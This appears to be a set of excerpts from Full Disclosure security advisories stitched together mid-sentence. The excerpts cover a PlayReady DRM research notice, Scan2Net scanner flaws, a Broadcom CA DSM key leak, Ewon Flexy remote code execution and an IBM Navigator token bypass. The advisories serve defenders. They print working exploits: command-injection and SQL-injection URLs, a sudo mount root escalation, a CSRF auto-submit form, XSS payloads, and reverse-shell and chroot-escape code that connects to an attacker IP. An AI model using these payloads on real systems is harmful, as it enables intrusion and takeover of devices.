        "content": "Hello All,\n\nWe have released a technical document pertaining to our Warbird / PMP security\nresearch. It is available for download from this location:\n\nhttps://security-explorations.com/materials/wbpmp_doc.md.txt\n\nThe document provides a more in-depth technical explanation, illustration and\nverification of discovered attacks affecting PlayReady on Windows 10 / 11 x64\nand pertaining to the following in particular:\n- Warbird deficiencies\n- content key sniffer operation\n- magic XOR keys discovery\n- white-box crypto attack\n- complete client identity compromise attacks\n\nMicrosoft aimed to implement state of the art code protection to mitigate\nsecurity threats related to client side based security through crypto, code\nintegrity, auth checks, white-box crypto, code obfuscation and kernel level\nsupport. Yet, a successful and complete (from an identity and content key\nsecurity point of view) PlayReady compromise could be achieved. This was\nprimarly due to some wrong assumption made with respect to code obfuscation,\ncrypto and OS kernel integration.\n\nWe proved these assumptions wrong by showing that:\n1) obfuscated code doesn't need to be analysed in a thorough fashion (or that\n   it doesn't need to be analysed at all),\n2) some crypto properties (or weaknesses such as bijections) can be revealed\n   through specially crafted inputs, which immediately lead to secret keys\n   extraction,\n3) kernel level support (`PEAuth` driver, protected process functionality)\n   didn't matter at all (no need for any privilege elevation).\n\nWhile Microsoft was well aware of the research impact (PlayReady for Windows\nbeing broken to pieces) along the amount of work it required, the company has\nnot expressed / signaled any interest to discuss access to this research on\na fair and commercial basis (regulating conditions of IP / know how use,\nmutual agreement on a price, etc.) for the last 8 months. Submitting our\nwork through MSRC was out of question due to the following:\n- the research took us nearly 9 months of work (on top of the 6 months of\n  R&D done in 2022, which has been \"consumed\" and in some way ignored by the\n  company), one more extra month needs to be added to this too (attacks #2-#4\n  and crypto proofs investigated due to platforms' avoidance to confirm the\n  initial XOR key attack,\n- the new research embeds some potentially valuable IP / know-how, which we\n  wanted to protect too, we have reasons to believe that some parties from a\n  PayTV industry use our ideas in their commercial products / services - we\n  inquired Nagra / Kudelski (PayTV / CAS security provider), Telefonica (the\n  owner of Movistar) and Cyfrowy Polsat (the owner of Polsat) about it, but\n  none of the companies responded (none clearly denied the use of our know\n  how / IP for commercial purposes as of writing of this message)\n- Microsoft Bounty Terms and Conditions, which implicate commercial use with\n  unknown payment terms, all non-negotiable and under Microsoft control)\n- Microsoft game plays in 2022 regarding PlayReady \"deficiencie\" (evaluation)\n  and their addressing.\n\nAnyway, we decided to give Microsoft (a company consisting of 100,000+\nsoftware engineers, with access to all the know-how, internal docs and source\ncodes) approx. the same amount of time to fix / address the issues as it took\nus (a 1 man shop relying on binaries and public info only) to analyze and\nreverse engineer the technology, discover the issues, develop illustrating\nPOCs and dedicated toolsets. Thus, Dec 2024 disclosure date.\n\nWe provided Microsoft with access to the complete research package comprising\nof a technical document, all toolsets with sources and test data (285MB ZIP\nfile) on Nov 18, 2024 and free of any charge (two weeks prior to the planned\ndisclosure). We indicated to Microsoft that sharing of the material was not\ndone as part of MSRC vulnerability reporting process (thus no obligation for\nany confirmation / follow ups / rewards / confidentiality / implicit license\ngranting, etc.), Microsoft was however informed that the research could be\nacquired by the company upon evaluation (commercial companies do not pay bills\n/ run business by waving a glossy \"thank you from Microsoft\" coupon at the\ncashier stand / checkout).\n\nAlthough Microsoft got all the details for free, the company is only partly\nthe winner here as its engineers likely failed to locate / address the root\ncause of the issues over the recent 8 months (no fixes / mitigations observed\nas of Nov 19, 2024). That's quite a shame in our opinion. The other source for\nthe shame lies in the nature of the issues and attacks described in the doc\n(vide 10 years of innovation and more than $1B invested).\n\nWhile we initially indicated to Microsoft that sharing of the research would\nimplicate the need to clear company's \"privileged position\" (access to the\ntoolset / know-how) and release POCs / source codes, we decided to postpone\nsuch a publication as of now.\n\nWe believe the disclosure provides both important contribution along a valuable\nperspective on the state of the art / security provided by PlayReady content\nsecurity technology (vide the nature of the issues uncovered / verification of\nvendor's claims).\n\nThank you.\n\nBest Regards,\nAdam Gowdiak\n\n----------------------------------\nSecurity Explorations -\nAG Security Research Lab\nhttps://security-explorations.com\n----------------------------------\n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\n",

It replaces the proprietary scanner drivers\nand software that traditional scanners require with the fastest common,\nnonproprietary connection available: TCP/IP over Ethernet. With network\ninterface speeds much higher than USB or SCSI, Scan2Net devices are able to\nreach unrivaled performance at very low connectivity cost. The Linux based\noperating system is dedicated to scanner specific imaging and mechanical control\ntasks, further maximizing scanning speeds and performance.\"\n\nSource: https://www.imageaccess.de/?page=SoftwareScan2Net&lang=en\n\n\nBusiness recommendation:\n------------------------\nThe vendor provides a firmware update to version 7.42B which should be installed\nimmediately. SEC Consult could only partially verify the correction of all\nidentified vulnerabilities. Some vulnerabilities have not been fixed by the\nvendor as the risk was accepted.\n\nSEC Consult highly recommends to perform a thorough security review of the\nproduct conducted by security professionals to identify and resolve potential\nfurther security issues.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) OS Command Injection (CVE-2024-28138)\nAn unauthenticated attacker with network access to the scanner can execute any\nsystem command via the \"msg_events.php\" script as the www-data user.\n\n2) Privilege Escalation (CVE-2024-28139)\nThe www-data user can elevate his privileges because sudo is configured to allow\nthe execution of the mount command as root without a password. Therefore, the\nprivileges can be escalated to the root user.\n\n3) Violation of Least Privilege Principle (CVE-2024-28140)\nThe scanner boots into a kiosk mode by default and opens the Scan2Net interface\nin a browser window. This browser is run with the permissions of the root user.\nThere are also several other applications running as root user, some of them are\nself-developed ones but those could not be exploited at first glance.\n\n4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)\nThe web application is not protected against cross-site request forgery attacks.\nTherefore, an attacker can trick users into performing actions on the\napplication when they visit an attacker-controlled website or click on a\nmalicious link.\n\n5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947)\nDue to missing input sanitization, an attacker can perform cross-site-scripting\nattacks and run arbitrary Javascript in the browser of other users.\n\n6) Insecure Password Change Function (CVE-2024-28143)\nThe password change function does not require the current password, which makes\nthe application vulnerable to account takeover, especially if combined with the\nCSRF vulnerability.\n\n7) Broken Access Control (CVE-2024-28144)\nDue to missing access control on the reboot and shutdown functions, an attacker\ncan perform a denial-of-service attack against the application.\nFurthermore, an attacker who can spoof the IP address and the User-Agent of a\nlogged-in user can takeover the session because of flaws in the self-developed\nsession management.\n\n8) Unauthenticated SQL Injection (CVE-2024-28145)\nAn unauthenticated attacker can perform an SQL injection by accessing the\ndbconnector.php file and supplying malicious GET parameters.\n\n9) Hard-coded Credentials (CVE-2024-28146)\nThe application uses several hard-coded credentials for protecting the firmware\nupdate file and the installed database server.\n\n\nUpdate 2024-04-02:\n------------------\nImageAccess GmbH provided us with an internet-facing test device and we spent\nsome short time verifying the vulnerabilities in their latest firmware (7.40)\nwhich should fix the security issues according to the vendor.\n\nUnfortunately, most of them are still present and new ones have been discovered.\n\nIn short:\n\n1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)\nFixed, but a new RCE vulnerability has been discovered which requires a session\nas Poweruser, updated PoC below.\nThe second RCE issue is tracked as CVE-2024-47946.\n\n2) Privilege Escalation (CVE-2024-28139)\nStill an issue.\n\n3) Violation of Least Privilege Principle (CVE-2024-28140)\nStill an issue.\n\n4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)\nFixed. The introduced \"session_id\" cookie is protected with the \"SameSite=Strict\"\ncookie flag. This prevents CSRF attacks.\n\n5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498)\nOriginal issues are fixed (CVE-2024-28142, CVE-2024-47947), but we discovered a\nnew one, updated PoC below. The new XSS is tracked as CVE-2024-36498.\n\n6) Insecure Password Change Function (CVE-2024-28143)\nFixed. The password change function now requires the current password.\n\n7) Broken Access Control (CVE-2024-28144)\nStill an issue.\nIf two users access the web interface from the same IP they are logged in as the\nother user. Updated PoC below.\n\n8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)\nOriginal issue fixed, but a new blind SQLi as Poweruser has been found, updated\nPoC below. The new SQLi is tracked as CVE-2024-50584.\n\n9) Hard-coded Credentials (CVE-2024-28146)\nStill an issue, credentials can be found in different files.\n\n\nUpdate 2024-10-14:\n------------------\nImageAccess GmbH provided us with an internet-facing test device and we spent\nsome short time verifying the vulnerabilities in their latest firmware (7.42)\nwhich should fix the submitted critical security issues according to the vendor.\n\n1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)\nThe new RCE vulnerability is fixed now.\n\n2) Privilege Escalation (CVE-2024-28139)\nStill an open issue. The risk has been accepted by the vendor because the other\ncritical issues are fixed and shell access is not easily possible anymore.\n\n3) Violation of Least Privilege Principle (CVE-2024-28140)\nThe kiosk browser is no longer running as root but many other custom services\nstill are.\n\n4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)\nFixed.\n\n5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498, CVE-2024-36494)\nThe third XSS (CVE-2024-36498) has also been fixed. We discovered a new XSS\nvulnerability in the login page which only works if the target user is _not_\nalready logged in, which makes it ideal for login form phishing attempts.\nThe new XSS is tracked as CVE-2024-36494.\n\n6) Insecure Password Change Function (CVE-2024-28143)\nFixed. The password change function now requires the current password.\n\n7) Broken Access Control (CVE-2024-28144)\nStill an issue.\n\n8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)\nThe blind SQLi as Poweruser has been fixed.\n\n9) Hard-coded Credentials (CVE-2024-28146)\nMostly fixed. Many credentials can be found in different files. The most\nproblematic 'support' user had their password rotated and it was not immediately\nobvious where it is stored now.\n\n\nProof of concept:\n-----------------\n1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)\nAn unauthenticated attacker with network access can execute arbitrary commands\nby visiting the following URL. The HTTP GET parameter \"data\" is not properly\nsanitized:\n\nhttps://$SCANNER/class/msg_events.php?action=writemsgfifo&data=;$COMMAND\n\nFor example, the following URL can be used to display information about the\ncurrent user of the web server:\n\nhttps://$SCANNER/class/msg_events.php?action=writemsgfifo&data=;id\n\nThe following image shows the output of the command:\n<01_os_command_injection.png>\n\nUpdate 2024-04-02:\n------------------\nThe second issue is now tracked as CVE-2024-47946.\nThe OS command injection as shown above is no longer possible in the new\nfirmware version 7.40. Another possibility to gain remote code execution\nhas been identified if the attacker has access to a valid Poweruser session.\nSpecifically crafted valid PNG files with injected PHP content can be uploaded\nas desktop backgrounds or lock screens. After the upload, the PHP script is\navailable in the web root. The PHP script executes once the uploaded file is\naccessed. This allows the execution of arbitrary PHP code and OS commands on\nthe device as \"www-data\".\n\n<01_os_command_injection_new.png>\n\n\n2) Privilege Escalation (CVE-2024-28139)\nBy executing the command \"sudo -l\" as the www-data user, it is apparent that\nthis user can be used to escalate privileges to root, as shown in the following\nfigure:\n\n<02-sudo-L.png>\n\nThe following commands can be executed to elevate to root privileges, as shown\nin the following figure:\n> sudo mount -o bind /usr/bin/bash /usr/bin/mount\n> sudo mount\n\n<02-sudo_mount.png>\n\n\n3) Violation of Least Privilege Principle (CVE-2024-28140)\nMany processes are running with root privileges which violates the principle of\nLeast Privilege.\n\nThis can be confirmed by running \"ps aux\" as the root user and observing the\noutput:\n\nroot  /opt/s2n/bin/S2NBrowserV7 --no-sandbox StartUpSelection.html x:0 y:800 w:1920 h:1080\nroot   \\_ /usr/lib/x86_64-linux-gnu/qt5/libexec/QtWebEngineProcess --type=zygote --no-sandbox --lang=en-US\nroot       \\_ /usr/lib/x86_64-linux-gnu/qt5/libexec/QtWebEngineProcess --type=zygote --no-sandbox --lang=en-US\n[...]\n\nApart from the browser the following binaries are also run with root permissions:\nvsftpd, smbd, wsdd.py, X11, OpenBox\ns2n-specific Binaries (copyd, s2ncopy, ocrd, imaged, camd_ucc1, admind, s2nwdd,\nledd, wt36keyb, ...).\n\n\n4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)\nThe application offers no protection against Cross-Site Request-Forgery.\nAn attacker can therefore forge malicious links to reset the admin password or\ncreate new users.\n\n4.1) Reset Admin Password\nThe following link resets the password of the administrator to the value\n\"CSRF2YOU!\". The password is base64-encoded (Q1NSRjJZT1Uh).\n\nhttps://$SCANNER/cgi/admin.cgi?-rsetpass+-aaction+-1Q1NSRjJZT1Uh+-2adm\n\n4.2) Register a new user\nThe following code can be hosted on a malicious page controlled by the attacker.\nWhen a user who is logged in as administrator is lured by the attacker to visit\nthis page, a new user \"SECtest\" with the password \"CSRF2YOU!\" is automatically\ncreated:\n\n<html>\n  <body>\n    <form action=\"https://$SCANNER/cgi/upuserdata.cgi\"; method=\"POST\">\n      <input type=\"hidden\" name=\"groupid\" value=\"0\" />\n      <input type=\"hidden\" name=\"username\" value=\"SECtest\" />\n      <input type=\"hidden\" name=\"pw1\" value=\"CSRF2YOU!\" />\n      <input type=\"hidden\" name=\"pw2\" value=\"CSRF2YOU!\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n\nThe following image shows the result:\n<04_register_user>.png\n\n\n5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498, CVE-2024-36494)\nThere are at least two identified injection points:\n\n5.1) Scenario 1: Stored XSS via User Settings -> File Name (CVE-2024-28142)\na. Login as Scan2Net User.\nb. Navigate to User Settings -> File Name (https://$SCANNER/cgi/uset.cgi?-cfilename)\nc. Edit the \"Wildcard Character\" %2 setting to contain the following payload and\n   reference it in the file name:\n\n   > <script>alert(document.location)</script>\n\n<05-1_xss_scenario_1.png>\n\nd. The JavaScript payload will be saved automatically.\ne. The payload will be triggered on each visit of the User Settings -> File Name\n   page.\n\nIt is also executed when an admin visits the following page:\nhttps://$SCANNER/cgi/uset.cgi?-cfilename\n\n <05-2_xss_scenario_1_triggered.png>\n\n\nThis attack can even be performed without being logged in because the affected\nfunctions are not fully protected. Without logging in, only the file name\nparameter of the \"Default\" User can be changed. However, the wildcards can be\nchanged without authentication. To inject the payload, the following two\nrequests have to be submitted.\n\nI. Changing the file name of the \"Default\" user to scan_xss%2.pdf:\nhttps://$SCANNER/cgi/chopt.cgi?uset+save_filename+scan_xss%252.pdf+filename+Default\n\nII. Changing the Wildcard %2 to the JavaScript payload:\nhttps://$SCANNER/cgi/chopt.cgi?fileabb+fileabb_customvalue2+%3Cscript%3Ealert(document.location)%3C/script%3E\n\n\n5.2) Scenario 2: Stored XSS via the ScanWizard Disclaimer (CVE-2024-47947)\nThe \"Edit Disclaimer Text\" function of the configuration menu is also vulnerable.\nOnly the users Poweruser and Admin can use this function which is available at\nthe URL\nhttps://$SCANNER/cgi/admin.cgi?-rdisclaimer+-apre\n\nThe JavaScript can be inserted as shown in this image:\n<05-3_xss_scenario_2_insertion.png>\n\n\nAfterwards, this change has to be applied by clicking on the \"Apply\" button.\nFrom now on the payload will be executed every time the ScanWizard is loaded.\nThe URL of the ScanWizard interface is: https://$SCANNER/ScanWizard.html\n\n<05-4_xss_scenario_2_trigger_browser.png>\n\nThis also includes the ScanWizard which is displayed in the Kiosk-mode browser\nwhich is present on the physical touch-enabled display of the scanner itself.\n\n<05-4_xss_scenario_2_trigger_touch.png>\n\n\nUpdate 2024-04-02:\n------------------\nThe third issue is now tracked as CVE-2024-36498.\nThe following text can be inserted as Poweruser into the disclaimer to\nexploit this issue:\n\n%3c%53%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%53%63%72%69%70%74%3e\n\nThis is the payload <Script>alert(1)</Script> URL-encoded.\n\n\nUpdate 2024-10-14:\n------------------\nThe fourth issue is now tracked as CVE-2024-36494.\nA new reflected XSS, which only works on unauthenticated targets, has been found:\n\nhttps://$SCANNER/cgi/slogin.cgi?-tsetup+-uuser%22%20onfocus%3ddocument.body.innerHTML%2B%3dlocation.hash,document.body.innerHTML%2b%3ddocument.body.innerText%20autofocus%20b%3d#<img/src=\"x\"onerror=\"alert(1)\"&gt\n\nUpdate 2024-11-12:\n------------------\nThe vendor tells us that the latest identified XSS issue should be fixed with\nversion 7.42B.\n\n\n6) Insecure Password Change Function (CVE-2024-28143)\nThe password change function does not require the user to enter the old password\nin order to set a new one. As explained in the CSRF finding (4.1),\nan attacker can use this to forcefully set a new password for a user without\nknowing the old password. The following link sets the password of the user, who\nclicks on it, to the value \"CSRF2YOU!\" which is \"1Q1NSRjJZT1Uh\" when encoded\nwith base64.\n\nhttps://$SCANNER/cgi/admin.cgi?-rsetpass+-aaction+-1Q1NSRjJZT1Uh+-2adm\n\n\n7) Broken Access Control (CVE-2024-28144)\n7.1) Reboot and Shutdown functions\nThe functions \"reboot\" and \"shutdown\" can be called without any authorization\nchecks nor any authentication:\nhttps://$SCANNER/cgi/shutdown.cgi\nhttps://$SCANNER/cgi/reboot.cgi\n\nThe authorization checks are also missing on the User Settings -> File Name and\nthe dbconnector as described in chapter 5.1 and 8 respectively.\n\n\n7.2) Broken Session Management\nScan2Net implements a custom algorithm for the session management.\nThe algorithm is implemented the following way:\n\n> SID1=\"$(/opt/s2n/bin/hide -s -e -i \"$REMOTE_ADDR:$HTTP_USER_AGENT\" -p $HOSTNAME)\"\n\nThe result is stored in the database as the current session ID. On each access\nrequest to Scan2Net the SID1 is calculated and compared to the stored session ID\nin the database.  This also means that only one user can be logged in at any\ntime.  Furthermore, an attacker who is able to spoof the IP address of a victim\nand knows the User Agent which was used to login, can take over the session of\nthe victim.\n\nUpdate 2024-04-02:\n------------------\nThe session management is still broken.\nStart two browsers of your choice (this example will use Chrome and Firefox).\nBrowse to https://$SCANNER_IP/cgi/config.cgi in both browsers. Notice that\nyou are not logged in in both ones and your \"login level\" is \"Default\".\nLogin in Chrome as Poweruser. Refresh the page in Firefox and notice that your\nlogin level now displays \"Poweruser\".\n\nBrowse to https://$SCANNER/cgi/slogin.cgi?-tsetup+-uPoweruser in Firefox\nand click on \"Edit Disclaimer Text\". You will get the following error message:\n\n<07-1_edit_disclaimer.png>\n<07-2_authentication_error.png>\n\nIn Firefox browse to https://$SCANNER_IP/ScanWizard.html,\nthen https://$SCANNER_IP/cgi/setupmenu.cgi and click on \"Edit Disclaimer Text\"\nonce more. This time you can edit the disclaimer.\n\n\n8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)\nAn unauthenticated attacker can reach the database connector at the following URL:\nhttps://$SCANNER/class/dbconnect.php\n\nThe connector accepts several query parameters:\n> action, search, table, field, value\n\nOf those, the parameters search, table, field, and value are vulnerable against\nSQL injection. For example, one SQL injection can be performed on the parameter\n\"field\" with the UNION keyword. The following request returns the version of the\nused SQL database server by union selecting \"@@version\":\n\nhttp://$SCANNER/class/dbconnect.php?action=getdbvalue&search=singlemode&table=user_touchscreen&field=configuration_name%20UNION%20ALL%20SELECT%20@@version--%20-&value=ScanWizard\n\nThe web server responds with:\n\n> HTTP/1.1 200 OK\n> […]\n> 10.3.38-MariaDB-0+deb10u1\n\nThe database is accessed with the rights of the user \"s2n\".\n\nUpdate 2024-04-02:\n------------------\nThe second issue is now tracked as CVE-2024-50584.\nThe injection point shown above has been fixed in the new firmware (7.40),\nbut a new exploitable injection point was discovered in template_io.php.\nAn attacker with an active session as Poweruser can access the following URL:\nhttps://$SCANNER/class/template_io.php\n\nThe PHP script processes the following query parameters:\n> action, table, templates\nThe templates parameter is vulnerable against blind boolean-based SQL injection\nattacks. SQL syntax must be injected into the JSON syntax of the templates\nparameter. As a short proof of concept the following three requests can be sent:\n\nhttps://$SCANNER/class/template_io.php?action=export&table=printer&templates={\"0\":\"default\"}\nhttps://$SCANNER/class/template_io.php?action=export&table=printer&templates={\"0\":\"default'+AND+1337=1336--+A\"}\nhttps://$SCANNER/class/template_io.php?action=export&table=printer&templates={\"0\":\"default'+AND+1337=1337--+A\"}\n\nFor the 1st (no injection) and 3rd (true condition) request the server responds\nwith the identical ZIP file in the response:\n\n> HTTP/1.1 200 OK\n> […]\n> Content-Length: 1699\n> PK[…]\n\nOnly the response from the 2nd request (false condition) differs in length and\ncontent.  This indicates that the injected SQL is processed by the database:\n\n> HTTP/1.1 200 OK\n> […]\n> Content-Length: 1268\n> PK[…]\n\nThe vulnerability was successfully exploited to exfiltrate data from the\nconnected database. As before, the database is accessed with the db user \"s2n\".\n\n\n9) Hard-coded Credentials (CVE-2024-28146)\nAfter obtaining root access to the scanner, the system could be examined and\nchecked for hard-coded credentials. The found credentials are used to encrypt\nconfig files during backup, decrypt the new firmware during an update and some\nof the listed passwords allow a direct connection to the database server of the\nscanner.\n\n| File                                | Usage                         | Username | Password      |\n| ----------------------------------- | ----------------------------- | -------- | ------------- |\n| /opt/s2n/www/cgi/infoio.cgi         | Encryption of exported config | -        | !Ba[REDACTED] |\n| /opt/s2n/www/cgi/sysupd-1           | Encryption of firmware update | -        | Gle[REDACTED] |\n| /opt/s2n/www/cgi/sysupd-2           | Encryption of firmware update | -        | Gli[REDACTED] |\n| /opt/s2n/www/cgi/sysupd-3           | Encryption of firmware update | -        | Bet[REDACTED] |\n| /opt/s2n/www/cgi/sysupd-7           | Encryption of firmware update | -        | 201[REDACTED] |\n| /opt/s2n/www/class/LocaleImport.php | login for database            | support  | HDD[REDACTED] |\n| /opt/s2n/www/class/DBmysqli.php     | login for database            | s2n      | fsc[REDACTED] |\n| /opt/s2n/www/class/dbconnect.php    | login for database            | mysql    | MK2[REDACTED] |\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following version has been tested which was the latest version available\nat the time of the test in 2023:\n* Firmware 7.31L on a WideTEK 36CL-600 Scanner\n\nAll previous versions of Scan2Net before 7.40 are affected, which are used in WideTEK\nor Bookeye scanners.\n\nSEC Consult was provided access to a patched scanner device by the vendor with\nfirmware 7.40 in March 2024.

This vulnerability can\nonly be exploited if a user is authenticated on the web interface. This way,\nan attacker can invoke commands and is able to get full control over the whole\ndevice.\n\n2) Reflected Cross-Site Scripting (CVE-2024-55545)\nA reflected cross-site scripting vulnerability is present on the sub page\n\"even_log.cgi\", which is used to display event logs. It can be exploited in the\ncontext of a victim's session.\n\n3) Stored Cross-Site Scripting (CVE-2024-55546)\nA stored cross-site scripting vulnerability has been identified in the\nfirmware of the device. It was identified in the device properties and can be\nexploited in the context of a victim's session.\n\n4) Remote Command Execution via SNMP (CVE-2024-55547)\nSNMP allows to write the nsExtendObjects. This enables an attacker to execute\ncommands on the operating system of the device.\n\n5) Denial of Service (CVE-2024-55548)\nA denial of service (DoS) condition can be reached if a password with more than\n16 characters is set in a user account. This is only possible as authenticated\nuser and by disabling the lenght check in the input fields.\n\nProof of Concept\n-------------------------------------------------------------------------------\n1) Authenticated Command Injection (CVE-2024-55544)\nThe following GET request creates a file named \"test\" in the \"/tmp\" directory.\n\n-------------------------------------------------------------------------------\nPOST /cgi-bin/even_log.cgi HTTP/1.1\nHost: 10.69.10.2\nUser-Agent: Mozilla/5.0 (X11;

No matter how complex your IT environment, it\nstreamlines the daily operational tasks that bog down your IT\norganization, helping you run more efficiently and cost-effectively than\never before.\"\n\nDue to improper privilege management, low-privileged Windows users or\nmalware running in their context are able to extract cryptographic keys\nthat are used to encrypt locally stored configuration data, which is\nalso accessible and can contain sensitive information, for example\nservice account credentials.\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nVulnerability Details:\n\nThe desktop and server management solution Broadcom CA DSM stores some\nconfiguration data of its agent component locally on managed systems in\nencrypted form. The encrypted configuration data may include sensitive\ndata like user credentials of service accounts.\n\nOn a managed client system, low-privileged Windows users are able to\nextract the used cryptographic key material that is used for encrypting\nspecific configuration data by exploiting a design security issue using\nthe Common Application Framework (CAF) command line tool.\n\nIt was also analyzed how specific configuration data containing Windows\naccount passwords is encrypted.\n\nWith access to the used cryptographic encryption method, the corresponding\ncryptographic key material, and the encrypted configuration data, an\nattacker is thus able to gain access to locally stored sensitive data\nin cleartext.\n\nDepending on the locally stored secrets, recovered user credentials\ncould be used for privilege escalation attacks and for gaining\nunauthorized access to other systems within the corporate network.\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nProof of Concept (PoC):\n\nMatthias Deeg developed a proof-of-concept software tool for extracting\nused cryptographic key material (\"global\" or \"local\" key) via the CAF\nprocess.\n\nThe following output exemplarily demonstrates extracting the used\n\"global\" cryptographic key, which is saved in the output file\n\"key_global.bin\":\n\nD:\\>CA_DSM_keydumper.exe global \"C:\\Program Files (x86)\\CA\\DSM\\Bin\\CAF.exe\"\n",

Initial administration access to the\nmachine is necessary.\n\n\nProof of Concept\n-------------------------------------------------------------------------------\n1) Authenticated Remote Code Execution (CVE-2024-9154)\nAfter initial access to the machine via the web interface and ftp is possible,\nwe can then upload Java applications (.jar) through FTP. These can then be\nexecuted through calling the corresponding API endpoint:\n===============================================================================\nhttp://<IP>/rcgi.bin/jvmCmd?cmd=start&runCmd=%20-heapsize%205M%20-classpath%20/usr/<application_name>.jar%20-emain%20<java_classname>\n===============================================================================\n\nThe Java application gets executed in its own sandbox, without permissions to\nwrite new files or access any system files. This can be circumvented by using\na shared library written in C. The Java application's source code was the\nfollowing:\n\npublic class SimpleRequester {\n\n    static {\n        System.setProperty(\"java.library.path\", \"/usr/lib\");\n        System.out.println(System.getProperty(\"java.library.path\"));\n\n        System.loadLibrary(\"reverse_shell\");\n    }\n\n    private native void open_reverse_shell(String ip, int port);\n\n    public static void main(String[] args) {\n\n        SimpleRequester requester = new SimpleRequester();\n        String serverIp = \"<attacker_IP>\";\n        int serverPort = 6666;\n\n\n        try {\n            requester.open_reverse_shell(serverIp, serverPort);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n\nThis code basically only loaded the shared library and called a certain\nfunction of it with the IP and port of our attack machine, waiting for a\nconnection. Then the following C code was written for the shared library:\n\n===============================================================================\n#include <jni.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <errno.h>\n#include <limits.h>\nvoid make_busybox_executable() {\n    if (chmod(\"./busybox\", 0755) < 0) {\n        perror(\"chmod\");\n    }\n}void start_busybox_shell(int sockfd) {\n    dup2(sockfd, STDIN_FILENO);\n    dup2(sockfd, STDOUT_FILENO);\n    dup2(sockfd, STDERR_FILENO);\n    execl(\"./busybox\", \"sh\", NULL);\n    perror(\"execl\");\n    close(sockfd);\n}\n\nJNIEXPORT void JNICALL Java_SimpleRequester_open_1reverse_1shell(JNIEnv *env, jobject obj, jstring ip, jint port) {\n    const char *ip_address = (*env)->GetStringUTFChars(env, ip, NULL);\n    int sockfd;\n    struct sockaddr_in serv_addr;\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    if (sockfd < 0) {\n        perror(\"socket\");\n        (*env)->ReleaseStringUTFChars(env, ip, ip_address);\n        exit(1);\n    }\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip_address, &serv_addr.sin_addr);\n    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {\n        perror(\"connect\");\n        close(sockfd);\n        (*env)->ReleaseStringUTFChars(env, ip, ip_address);\n        exit(1);\n    }    make_busybox_executable();    start_busybox_shell(sockfd);    close(sockfd);\n    (*env)->ReleaseStringUTFChars(env, ip, ip_address);\n}\n===============================================================================\nThe shared library basically took a static shell binary, which we uploaded via\nFTP, made it executable and started a reverse shell with the given IP and port\nthrough the static shell binary. This allowed a reverse connection to the\nattacking machine.\n\nAs the Java application is running in a \"sandbox\", which is using a chroot to a\nfolder without any binaries and just the files from the user's home directory,\nit was then possible to use another C binary to escape this chroot and become\nroot user of the whole machine. The escape code was the following:\n\n#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void)\n{\n    mkdir(\"chroot-dir\", 0755);\n    chroot(\"chroot-dir\");\n    for(int i = 0; i < 1000; i++) {\n        chdir(\"..\");\n    }\n    chroot(\".\");\n    system(\"/bin/sh\");\n}\n\n===============================================================================\n\n\nSolution\n-------------------------------------------------------------------------------\nNone.\n\n\nWorkaround\n-------------------------------------------------------------------------------\nRestrict network access to the device.\n\n\nRecommendation\n-------------------------------------------------------------------------------\nRegardless to the current state of the vulnerability, CyberDanube recommends\ncustomers from Ewon Flexy to upgrade the firmware to the latest version\navailable. Furthermore, a full security review by professionals is recommended.\n\n\nContact Timeline\n-------------------------------------------------------------------------------\n2024-09-26: Contacting HMS Networks via hms-csrt () hms-networks com.\n2024-09-30: HMS Networks representative replies they will investigate.\n2024-10-21: Asked for an update.\n2024-10-22: Contact stated, that the vulnerability is not relevant, because the\n            firmware can be downgraded with firmware update permissions and the\n            device can be rooted anyway by doing so.\n            Asked contact if firmware downgrades are required.

By sending a specially crafted request, an\nauthenticated attacker could exploit this\nvulnerability to remotely perform operations that the user is not\nallowed to perform when using Navigator for i.\n\nThe web application generates an HTTP security token ID called \"Mn:\"\nwith a 19 digit value and is set in the HTTP session response header\nper user.\nNavigator, uses this token for integrity purpose to protect against\narbitrary and or malicious HTTP requests. Therefore, upon receipt of a\nbogus\nsecurity token in an HTTP request the server will respond with HTTP\n403 Forbidden message.\n\nHowever, attackers can modify existing tokens to bypass the 403\nForbidden directive to achieve their objectives. Problem is Navigator\nsecurity token logic\ndoes not properly create or detect if a security token is valid or if\nit has been tampered with.\n\nAttackers can manipulate the last eight digits of a token by setting\nthem to all 0000s (zeroes) and or increment them by one, token length\nmust be the same.\nThis can trick the application into processing attacker controlled\nsecurity tokens as the server thinks it is valid, this undermines the\nsecurity of this protection.\n\nE.g.

